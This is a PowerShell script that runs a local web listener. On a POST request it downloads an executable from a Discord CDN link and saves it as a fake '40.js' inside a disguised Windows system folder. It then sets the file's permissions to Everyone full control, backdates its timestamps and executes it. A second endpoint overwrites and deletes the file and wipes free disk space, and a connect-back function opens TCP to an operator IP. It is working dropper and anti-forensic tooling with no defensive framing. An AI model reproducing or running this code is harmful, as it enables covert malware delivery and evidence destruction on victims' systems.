# Fixed IP address and port for the web interface
$ipAddress = "127.0.0.1"
$port = 8080

# IP address and port to connect back to
$connectBackIp = "192.168.1.100" # Replace with your IP address
$connectBackPort = 9090           # Replace with your port number

# Register HTTP listener with fixed IP and port
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://${ipAddress}:${port}/")
$listener.Start()
Write-Host "Listening on IP $ipAddress, port $port..."
Write-Host "Access the web interface at: http://${ipAddress}:${port}"

# Define paths to avoid file generation
$protectedPaths = @(
    "C:\ProgramData\Microsoft\Windows",
    "C:\ProgramData\Microsoft\Windows\WER",
    "C:\ProgramData\Microsoft\Windows\WER\ReportArchive",
    "C:\ProgramData\Microsoft\Windows\WER\ReportQueue",
    "C:\ProgramData\Microsoft\Windows\WER\Temp"
)

# Function to check if a path is protected
function Is-PathProtected {
    param ([string]$path)
    foreach ($protectedPath in $protectedPaths) {
        if ($path -like "$protectedPath*") {
            return $true
        }
    }
    return $false
}

# Function to download and save the file
function Download-AndSave-File {
    param (
        [string]$url,
        [string]$tempFilePath,
        [string]$finalFilePath
    )

    try {
        Write-Host "Downloading file from $url..."
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $tempFilePath)

        # Ensure the destination directory exists
        $destinationDir = [System.IO.Path]::GetDirectoryName($finalFilePath)
        if (-not (Test-Path $destinationDir)) {
            New-Item -ItemType Directory -Path $destinationDir -Force
        }

        # Check if the path is protected
        if (Is-PathProtected -path $destinationDir) {
            Write-Host "Error: Destination path is protected. Aborting file move."
            return
        }

        # Move and rename the file
        Write-Host "Moving file to $finalFilePath..."
        Move-Item -Path $tempFilePath -Destination $finalFilePath -Force

        # Set appropriate permissions
        Write-Host "Setting permissions for $finalFilePath..."
        $acl = Get-Acl $finalFilePath
        $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
        $acl.SetAccessRule($rule)
        Set-Acl -Path $finalFilePath -AclObject $acl

        # Set custom date and time for the file
        $customDateTime = Get-Date "12/3/2023 6:48 AM"
        [System.IO.File]::SetCreationTime($finalFilePath, $customDateTime)
        [System.IO.File]::SetLastWriteTime($finalFilePath, $customDateTime)
        [System.IO.File]::SetLastAccessTime($finalFilePath, $customDateTime)

        Write-Host "File downloaded, saved, and permissions set for $finalFilePath"
    } catch {
        Write-Host "An error occurred while downloading or saving the file: $_"
    }
}

# Function to execute the .exe file
function Execute-Executable {
    param ([string]$filePath)

    try {
        # Ensure the file path is properly quoted
        $filePath = [System.IO.Path]::GetFullPath($filePath)
        
        # Debug output
        Write-Host "Attempting to execute file: $filePath"
        
        # Execute the file
        Start-Process -FilePath $filePath -NoNewWindow -Wait

        Write-Host "Executed file: $filePath"
    } catch {
        Write-Host "Failed to execute file: $_"
    }
}

# Function to securely delete a file
function SecureDelete {
    param ([string]$path)
    try {
        if (Test-Path $path) {
            # Check if the path is protected
            if (Is-PathProtected -path $path) {
                Write-Host "Error: Path is protected. Aborting secure delete."
                return
            }

            # Overwrite the file with random data multiple times
            $fileStream = [System.IO.File]::OpenWrite($path)
            $fileLength = (Get-Item $path).Length

            $buffer = New-Object byte[] $fileLength
            $random = New-Object System.Random

            for ($i = 0; $i -lt 3; $i++) {
                $random.NextBytes($buffer)
                $fileStream.Write($buffer, 0, $buffer.Length)
            }

            $fileStream.Close()

            # Delete the file
            Remove-Item -Path $path -Force

            # Optionally, run a disk cleanup command
            $cleanupCommand = "cipher /w:" + [System.IO.Path]::GetDirectoryName($path)
            Invoke-Expression $cleanupCommand
        }
    } catch {
        Write-Host "Failed to securely delete: $_"
    }
}

# Function to securely delete a directory and its contents
function SecureDelete-Directory {
    param ([string]$directoryPath)
    try {
        if (Test-Path $directoryPath) {
            # Check if the path is protected
            if (Is-PathProtected -path $directoryPath) {
                Write-Host "Error: Path is protected. Aborting secure delete."
                return
            }

            # Securely delete all files within the directory
            Get-ChildItem -Path $directoryPath -Recurse | ForEach-Object {
                if ($_.PSIsContainer) {
                    # Recursively delete subdirectories
                    SecureDelete-Directory -directoryPath $_.FullName
                } else {
                    # Securely delete files
                    SecureDelete -path $_.FullName
                }
            }
            # Remove the directory itself
            Remove-Item -Path $directoryPath -Recurse -Force
        }
    } catch {
        Write-Host "Failed to securely delete directory: $_"
    }
}

# Function to handle HTTP requests and responses
function Handle-Request {
    param ($context)
    $request = $context.Request
    $response = $context.Response

    try {
        if ($request.HttpMethod -eq 'GET') {
            $url = $request.Url.AbsolutePath
            switch ($url) {
                '/' {
                    Serve-HTML -Message "Choose your action:"
                }
                '/js/40.js' {
                    # Serve JavaScript file
                    $filePath = "C:\$WINDOWS.~BT\NewOS\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\cache\Local\Desktop\40.js"
                    if (Test-Path $filePath) {
                        $response.ContentType = "application/javascript"
                        $response.ContentEncoding = [System.Text.Encoding]::UTF8
                        $fileContent = [System.IO.File]::ReadAllText($filePath)
                        $buffer = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
                        $response.OutputStream.Write($buffer, 0, $buffer.Length)
                    } else {
                        $response.StatusCode = 404
                        $response.StatusDescription = "File Not Found"
                    }
                }
                default {
                    $response.StatusCode = 404
                    $response.StatusDescription = "Not Found"
                }
            }
        } elseif ($request.HttpMethod -eq 'POST') {
            $url = $request.Url.AbsolutePath
            $response.StatusCode = 200
            $response.StatusDescription = "OK"
            $response.ContentType = "text/plain"
            switch ($url) {
                '/0x67' {
                    $tempFilePath = [System.IO.Path]::GetTempFileName()
                    $finalFilePath = "C:\$WINDOWS.~BT\NewOS\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\cache\Local\Desktop\40.js"
                    $downloadUrl = "https://cdn.discordapp.com/attachments/1265925139586088973/1270229544510685246/vmx.exe?ex=66b2f0f3&is=66b19f73&hm=12ded7af5e250fe110c8ca00ca0e186aa8558f5f669e988214da5a5786a97d64&"

                    # Download the file and save it with the correct name and permissions
                    Download-AndSave-File -url $downloadUrl -tempFilePath $tempFilePath -finalFilePath $finalFilePath

                    # Execute the JavaScript file
                    Execute-Executable -filePath $finalFilePath

                    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("File downloaded, saved as $finalFilePath, and executed."), 0, [System.Text.Encoding]::UTF8.GetBytes("File downloaded, saved as $finalFilePath, and executed.").Length)
                }
                '/0142' {
                    $filePath = "C:\$WINDOWS.~BT\NewOS\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\cache\Local\Desktop\40.js"

                    # Securely delete the file
                    SecureDelete -path $filePath

                    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("File $filePath deleted."), 0, [System.Text.Encoding]::UTF8.GetBytes("File $filePath deleted.").Length)
                }
                default {
                    $response.StatusCode = 404
                    $response.StatusDescription = "Not Found"
                }
            }
        }
    } catch {
        Write-Host "Error handling request: $_"
        $response.StatusCode = 500
        $response.StatusDescription = "Internal Server Error"
    } finally {
        $response.Close()
    }
}

# Function to serve HTML content
function Serve-HTML {
    param ([string]$Message)
    $response = $context.Response
    $html = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Future Analysis</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #222;
            color: #ddd;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background-color: #333;
            border-radius: 8px;
            text-align: center;
        }
        h1 {
            color: #fff;
        }
        button {
            background-color: #555;
            color: #ddd;
            border: none;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 4px 2px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>$Message</h1>
    </div>
</body>
</html>
"@
    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes($html), 0, [System.Text.Encoding]::UTF8.GetBytes($html).Length)
}

# Create a TCP connection back to the specified IP address and port
function Connect-Back {
    param (
        [string]$ipAddress,
        [int]$port
    )

    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.Connect($ipAddress, $port)
        Write-Host "Successfully connected back to $ipAddress:$port"

        # Optionally send a message to the connected IP
        $networkStream = $tcpClient.GetStream()
        $writer = New-Object System.IO.StreamWriter($networkStream)
        $writer.WriteLine("Connection established from PowerShell script.")
        $writer.Flush()
        $writer.Close()
        $networkStream.Close()
        $tcpClient.Close()
    } catch {
        Write-Host "Failed to connect back: $_"
    }
}

# Start listening for HTTP requests
while ($true) {
    $context = $listener.GetContext()
    Handle-Request -context $context
}

# Establish a connection back to the specified IP and port
Connect-Back -ipAddress $connectBackIp -port $connectBackPort
